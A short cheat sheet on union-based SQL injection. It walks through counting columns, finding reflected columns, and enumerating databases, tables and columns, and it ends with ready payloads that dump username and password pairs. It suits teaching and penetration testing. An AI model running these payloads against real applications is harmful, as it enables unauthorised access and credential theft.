# Union-Based SQL Injection

## Methodology
Union-based SQL Injection allows an attacker to append the results of their own query to the results of the original query executed by the application.

### Key Prerequisites
1. **Column Match**: The injected query must return the exact same number of columns as the original query.
2. **Data Type Compatibility**: The data types of the columns in the injected query must be compatible/compatible enough with the original query's columns.

---

## Exploitation Workflow

### Step 1: Detect Vulnerability & Inject comments
Inject `'` or `"` and attempt to comment out the rest of the query:
* MySQL: `' -- -` or `' #`
* PostgreSQL/MSSQL: `' --`

### Step 2: Determine Number of Columns
Use `ORDER BY` incrementally:
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
When a query fails or behaves differently (e.g. `Unknown column 'X' in 'order clause'`), the previous number is the correct number of columns.

Or use `UNION SELECT`:
```sql
' UNION SELECT NULL, NULL, NULL-- -
```

### Step 3: Determine Column Types / Reflected Columns
Identify which columns are visible and support strings:
```sql
' UNION SELECT 'a', 'b', 'c'-- -
```

### Step 4: Dump Database Information
Once you find the reflected column (e.g., column 2):
* **Current Database & User**:
  ```sql
  ' UNION SELECT 1, concat(database(), ':', user()), 3-- -
  ```
* **Enumerate Tables**:
  ```sql
  ' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -
  ```
* **Enumerate Columns**:
  ```sql
  ' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -
  ```
* **Dump Data**:
  ```sql
  ' UNION SELECT 1, concat(username, ':', password), 3 FROM users-- -
  ```
